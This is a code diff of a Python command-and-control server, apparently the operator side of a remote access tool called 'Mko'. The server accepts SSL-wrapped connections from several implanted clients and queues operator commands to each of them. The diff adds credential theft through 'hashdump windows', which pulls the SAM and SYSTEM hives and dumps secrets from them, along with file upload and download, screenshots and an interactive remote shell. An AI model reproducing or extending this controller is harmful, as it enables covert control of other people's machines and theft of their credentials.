@@ -1,9 +1,12 @@
-import lib
+import queue
 import socket
+import ssl
 import threading
-import os
-from command_controller import Client
+import random
+import time
 
+import lib
+from command_controller import Client
 
 server_host = '0.0.0.0'
 server_port = 1234
@@ -11,158 +14,249 @@ max_number_of_connections = 5
 
 threads = {}
 clients = []
+client_queues = {}
+thread_to_conn = {}
+
+context_manager = None  # Context manager to know in which context the program is running (client or manager)
+connection_allowed = True
+
+# Charger les fichiers de certificats SSL
+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
 
 
-def handle_client(conn, addr):
-    print(f"\n[+] New connection with {addr[0]}:{addr[1]} \nMko >", end=" ")
+def handle_client(conn, addr, command_queue):
+    global connection_allowed
+    global context_manager
+    print(f"\n[+] New connection with {addr[0]}:{addr[1]}")
 
-    # os_client = conn.recv(1024).decode('utf-8')
-    # client = Client(os_client)  # Create a new client object
-    # print(f"Client OS: {client.get_client_os()}")
+    if context_manager is None:
+        lib.print_mko_prefix()
+    else:
+        lib.print_mko_client(context_manager)
 
-    while True:
+    current_thread = threading.current_thread()
+
+    client_os = conn.recv(1024).decode('utf-8')
+    client = Client(client_os)
+
+    while connection_allowed:
         try:
-            message = client_socket.recv(1024).decode('utf-8')
-            if not message:
-                break
-            print(f"[{addr}] {message}")
+            # Check if there are any commands to send to the client
+            if not command_queue.empty():
+                # prepare the command
+                command = command_queue.get()
+                command = command.replace('"', '')
+                command = client.command_controller(command.lower())
 
-        except:
-            break
+                # Send the command to the client
+                if command != "shell":
+                    if command != "help" and \
+                            command != "unknown" and \
+                            command != "error":
 
-        # command = input("MKo > ")
-        # if command == "exit":
-        #     conn.send(command.encode('utf-8'))
-        #     break
-        #
-        # if command == "help" or command == "?":
-        #     lib.print_help()
-        #     continue
-        #
-        # if command.startswith("upload"):
-        #     file_path = command.split(" ")[1]
-        #     if not os.path.isfile(file_path):
-        #         print(f"Le fichier {file_path} n'existe pas.")
-        #         continue
-        #
-        #     print(f"Uploading {file_path}...")
-        #     conn.send(command.encode('utf-8'))
-        #
-        #     file_size = os.path.getsize(file_path)
-        #     conn.send(file_size.to_bytes(8, 'big'))
-        #     print(f"Sent file size: {file_size} bytes")
-        #
-        #     with open(file_path, "rb") as file:
-        #         while (chunk := file.read(1024)):
-        #             conn.send(chunk)
-        #
-        #     print("File uploaded successfully")
-        #
-        # if command == "shell":
-        #     conn.send(command.encode('utf-8'))
-        #     while True:
-        #         command = input("MKo (shell) > ")
-        #         if command == "exit":
-        #             conn.send(command.encode('utf-8'))
-        #             break
-        #
-        #         conn.send(command.encode('utf-8'))
-        #         output = conn.recv(4096).decode('utf-8')
-        #         print(output)
-        #
-        # if command == "getuid":
-        #     conn.send(client.getuid().encode('utf-8'))
-        #     output = conn.recv(1024).decode('utf-8')
-        #     print(output)
-        #
-        # if command == "ipconfig":
-        #     conn.send(command.encode('utf-8'))
-        #     output = conn.recv(4096).decode('utf-8')
-        #     print(output)
-        #
-        # if command == "ls":
-        #     conn.send(client.ls().encode('utf-8'))
-        #     output = conn.recv(4096).decode('utf-8')
-        #     print(output)
-        #
-        # if command == "pwd":
-        #     conn.send(command.encode('utf-8'))
-        #     output = conn.recv(1024).decode('utf-8')
-        #     print(output)
-        #
-        # if command.lower().startswith("search"):
-        #     conn.send(command.encode('utf-8'))
-        #     output = conn.recv(4096).decode('utf-8')
-        #     print(output)
-        #
-        if command == "":
-            print("help or ? to display help")
-            print("you can also use ? <command> to get help on a specific command")
-            print("\n")
+                        conn.send(command.encode('utf-8'))
+
+                        if command == "hashdump windows":
+                            # check if the client is running on elevated privileges
+                            check_right = conn.recv(1024).decode('utf-8')
+                            if check_right == "The client is not running with elevated privileges":
+                                print("The client is not running with elevated privileges")
+                                lib.print_mko_client(current_thread.ident)
+                                continue
+                            else:
+                                sam_path = lib.download_file("sam", conn)
+                                download_status = conn.recv(1024).decode('utf-8')
+                                if download_status == "NOK":
+                                    print("[-] Error while downloading the file.")
+                                    lib.print_mko_client(current_thread.ident)
+
+                                # sleep to avoid conflict
+                                time.sleep(1)
+                                sys_path = lib.download_file("system", conn)
+                                download_status = conn.recv(1024).decode('utf-8')
+                                if download_status == "NOK":
+                                    print("[-] Error while downloading the file.")
+                                    lib.print_mko_client(current_thread.ident)
+
+                                lib.secret_dump_from_file(sam_path, sys_path)
+
+                        if command.startswith("upload"):
+                            file_path = command.split(" ")[1]
+                            lib.upload_file(file_path, conn)
+
+                        if command.startswith("download"):
+                            lib.download_file(command, conn)
+
+                        if command == "screenshot":
+                            # random str (8char) to avoid conflict
+                            random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+                            screenshot_path = f"screenshot_{random_str}.png"
+                            screenshot_status = conn.recv(1024).decode('utf-8')
+                            if screenshot_status == "NOK":
+                                pass
+                                # print("[-] No display detected on client")
+                                # lib.print_mko_client(current_thread.ident)
+                            elif screenshot_status == "ok":
+                                lib.download_file(screenshot_path, conn)
+
+                        # If the command is "close", close the connection
+                        if command == "close":
+                            break
+
+                        # Receive the output of the command if it's not
+                        # hashdump windows command
+                        if command != "hashdump windows":
+                            message = conn.recv(4096).decode('utf-8')
+                            if not message:
+                                break
+                            print(f"{message}\n")
+
+                    lib.print_mko_client(current_thread.ident)
+
+        except socket.timeout:
+            conn.send("close".encode('utf-8'))
             continue
 
-    print(f"[+] Connection closed with {addr[0]}:{addr[1]}")
+    print(f"\n[+] Connection closed with {addr[0]}:{addr[1]}")
+
+    if context_manager is None:
+        lib.print_mko_prefix()
+    else:
+        if context_manager == current_thread.ident:
+            context_manager = None
+            # remove current client from the list
+
+            #get the key of current_thread.ident in threads
+            key = None
+            for k, v in threads.items():
+                if v == current_thread.ident:
+                    key = k
+                    break
+
+            threads.pop(key)
+
+            lib.print_mko_prefix()
+
+
+        else:
+            lib.print_mko_client(context_manager)
+
     conn.close()
+    clients.pop(clients.index((conn, addr)))
+    client_queues.pop(conn)
 
 
 def accept_clients(s):
-    while True:
-        conn, addr = s.accept()
-        clients.append((conn, addr))
-        thread = threading.Thread(target=handle_client, args=(conn, addr))
+    global connection_allowed
+    while connection_allowed:
+        try:
+            s.settimeout(1)
+            conn, addr = s.accept()
+            conn = context.wrap_socket(conn, server_side=True)  # Envelopper le socket avec SSL
+            clients.append((conn, addr))
 
-        # prepare to store the next thread ID
-        if len(threads) == 0:
-            next_thread_id = 0
-        else:
-            next_thread_id = max(threads.keys()) + 1
+            # Create a new queue for this client
+            command_queue = queue.Queue()
+            client_queues[conn] = command_queue
 
-        # start the thread
-        thread.start()
+            thread = threading.Thread(target=handle_client, args=(conn, addr, command_queue))
 
-        # store the thread ID
-        id_thread = thread.ident
-        threads[next_thread_id] = id_thread
+            # Prepare to store the next thread ID
+            if len(threads) == 0:
+                next_thread_id = 0
+            else:
+                next_thread_id = max(threads.keys()) + 1
 
-        # print(f"[CONNECTION WAITING] {addr[0]}:{addr[1]} is waiting. Thread ID: {thread.ident}")
+            # Start the thread
+            thread.start()
+
+            # Store the thread ID
+            id_thread = thread.ident
+            threads[next_thread_id] = id_thread
+            thread_to_conn[id_thread] = conn
+        except socket.timeout:
+            continue
 
 
-# Fonction pour interagir avec le terminal et choisir un thread
+# Function to interact with the terminal and choose a thread
 def command_line_interface():
-    while True:
-        command = input("Mko > ")
+    global connection_allowed
+    global context_manager
+    lib.print_mko_prefix()
 
-        # if the command is to use a thread
+    while True:
+        command = input()
+
         if command.startswith("use"):
             try:
-                thread_id = int(command.split()[1])
-                if thread_id in threads:
-                    print(f"Vous utilisez maintenant le thread {thread_id}")
-                    # interact with the selected thread here
 
-                    break
-                elif thread_id in threads.values():
-                    print(f"Vous utilisez maintenant le thread {thread_id}")
-                    # interact with the selected thread here
+                thread_id_from_command = int(command.split()[1])
+                thread_id = None
+                thread_index = None
 
-                    break
+                if thread_id_from_command in thread_to_conn:
+                    # Get the thread ID with the value
+                    thread_id = thread_id_from_command
+
+                    # Get the thread index with the value
+                    for key, value in threads.items():
+                        if value == thread_id:
+                            thread_index = key
+                            break
+
+                elif thread_id_from_command in threads:
+                    thread_id = threads[thread_id_from_command]
+                    thread_index = thread_id_from_command
+
+                if thread_id is not None:
+
+                    context_manager = thread_id
+                    command_queue_manager = lib.use_manager(thread_id, thread_to_conn, client_queues)
+
+                    if command_queue_manager == "close":
+                        threads.pop(thread_index)
+                        thread_to_conn.pop(thread_id)
+
+                    elif command_queue_manager == "shell":
+                        lib.interact_shell(thread_to_conn[thread_id], thread_id)
+
+                    lib.print_mko_prefix()
+                    context_manager = None
+
                 else:
-                    print(f"Aucun thread trouvé avec l'ID {thread_id}")
-            except ValueError:
-                print("ID de thread invalide. Veuillez entrer un numéro de thread valide.")
+                    print(f"No thread found with ID {thread_id}")
+                    lib.print_mko_prefix()
 
-        # if the command is to list all threads
+            except Exception as e:
+                print(f"An error occurred")
+                print("Unknown command. Try 'use <ID>' or 'list' to list all threads.")
+                lib.print_mko_prefix()
+
         elif command == "list":
             print("ID   TID   \n--   ---  ")
             for thread_id in threads:
                 print(f"{thread_id}   {threads[thread_id]}")
             print("\n")
+            lib.print_mko_prefix()
+
+        elif command == "exit":
+            print("Exiting...")
+            connection_allowed = False
+            break
+
+        elif command == "help" or command == "?" or command == "h" or command == "H" or command == "HELP":
+            lib.print_help_manager()
+            lib.print_mko_prefix()
 
         else:
-            print("Unknow command. Try 'use <ID>' or 'list' to list all threads.")
+            lib.print_mko_prefix()
 
 
 def main():
+    # display the banner
+    lib.print_mko_banner()
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((server_host, server_port))
     s.listen(max_number_of_connections)
@@ -175,23 +269,12 @@ def main():
     # Display threads control information - GUI
     command_line_interface()
 
-    # Attendre que le thread d'acceptation se termine
-    accept_thread.join()
-    s.close()
-
     for conn, addr in clients:
+        # send exit to each client
+        conn.send("exit".encode('utf-8'))
         conn.close()
 
-    # while True:
-    # conn, addr = s.accept()
-    # thread = threading.Thread(target=handle_client, args=(conn, addr))
-    # thread.start()
-    #
-    # # afficher les threads actifs
-    # print(f"{threading}")
-    #
-    # # afficher le nombre de threads actifs
-    # print(f"[+] Threads actifs: {threading.active_count() - 1}")
+    print("\nServer closed.")
 
 
 if __name__ == "__main__":
